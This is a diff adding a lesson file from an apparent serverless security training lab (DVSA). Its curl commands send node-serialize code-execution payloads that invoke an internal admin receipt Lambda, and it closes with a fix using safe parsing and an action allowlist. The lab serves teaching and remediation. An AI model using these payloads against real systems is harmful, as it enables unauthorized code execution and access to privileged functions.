@@ -1,0 +1,126 @@
+# Lesson 3 folder file
+
+**Filename:** `Lesson 3 Code.md`
+
+```markdown
+# Lesson 3 – Sensitive Information Disclosure Code
+
+## Environment Variables
+
+```bash
+export API="<API_URL>"
+export TOKEN_B="<TOKEN_B>"
+
+
+## Decode the JWT Token
+
+python3 - <<'PY'
+import os, json, base64, time
+t = os.environ["TOKEN_B"]
+p = t.split(".")[1]
+p += "=" * (-len(p) % 4)
+d = json.loads(base64.urlsafe_b64decode(p.encode()))
+print("sub     :", d.get("sub"))
+print("username:", d.get("username"))
+print("exp     :", d.get("exp"))
+print("now     :", int(time.time()))
+print("expired?:", int(time.time()) > d["exp"])
+PY
+
+
+## Verify Normal Behavior
+
+curl -sS -X POST "$API" \
+  -H "content-type: application/json" \
+  -H "authorization: $TOKEN_B" \
+  --data-raw '{"action":"orders"}' \
+  -w '\nHTTP_CODE=%{http_code}\n'
+
+
+## Send Marker Payload
+
+curl -sS -X POST "$API" \
+  -H "content-type: application/json" \
+  -H "authorization: $TOKEN_B" \
+  --data-raw '{"action":"_$$ND_FUNC$$_function(){console.error(\"PATCH_TEST_123\");}()","cart-id":""}' \
+  -w '\nHTTP_CODE=%{http_code}\n'
+
+
+## Add aws-sdk@2 to the Lambda Package
+
+mkdir -p ~/dvsa-order-manager
+cd ~/dvsa-order-manager
+unzip /path/to/DVSA-ORDER-MANAGER.zip
+
+export PATH=/usr/bin:/bin:$PATH
+hash -r
+
+npm install aws-sdk@2
+zip -r ~/dvsa-order-manager-with-awssdk.zip .
+
+
+## Verify aws-sdk Loaded
+
+curl -sS -X POST "$API" \
+  -H "content-type: application/json" \
+  -H "authorization: $TOKEN_B" \
+  --data-raw '{"action":"_$$ND_FUNC$$_function(){try{var a=require(\"aws-sdk\");console.error(\"STEP_OK_3\");}catch(e){console.error(\"STEP_ERR_3:\"+e.message);} }()","cart-id":""}' \
+  -w '\nHTTP_CODE=%{http_code}\n'
+
+
+## Trigger Internal Receipt Function
+
+curl -sS -X POST "$API" \
+  -H "content-type: application/json" \
+  -H "authorization: $TOKEN_B" \
+  --data-raw '{"action":"_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p={FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",InvocationType:\"RequestResponse\",Payload:JSON.stringify({\"year\":\"<YEAR>\",\"month\":\"<MONTH>\"})};lambda.invoke(p,function(e,d){console.error(\"RECEIPT_URL_RESULT:\"+JSON.stringify({error:e,payload:d&&d.Payload}));}); }()","cart-id":""}' \
+  -w '\nHTTP_CODE=%{http_code}\n'
+
+
+## Fix – Safe Parsing and Action Allowlist (change req  and headers with this code)
+
+let req;
+let headers;
+
+try {
+    req = typeof event.body === "string" ? JSON.parse(event.body) : event.body;
+    headers = typeof event.headers === "string"
+      ? JSON.parse(event.headers)
+      : (event.headers || {});
+} catch (e) {
+    return callback(null, {
+        statusCode: 400,
+        headers: { "Access-Control-Allow-Origin": "*" },
+        body: JSON.stringify({ status: "err", msg: "invalid json" })
+    });
+}
+
+
+##Add before the switch
+
+const allowedActions = new Set([
+  "new",
+  "update",
+  "cancel",
+  "get",
+  "orders",
+  "account",
+  "profile",
+  "shipping",
+  "billing",
+  "complete",
+  "inbox",
+  "message",
+  "delete",
+  "upload",
+  "feedback",
+  "admin-orders"
+]);
+
+if (!req || typeof req.action !== "string" || !allowedActions.has(req.action)) {
+    return callback(null, {
+        statusCode: 400,
+        headers: { "Access-Control-Allow-Origin": "*" },
+        body: JSON.stringify({ status: "err", msg: "unknown action" })
+    });
+}
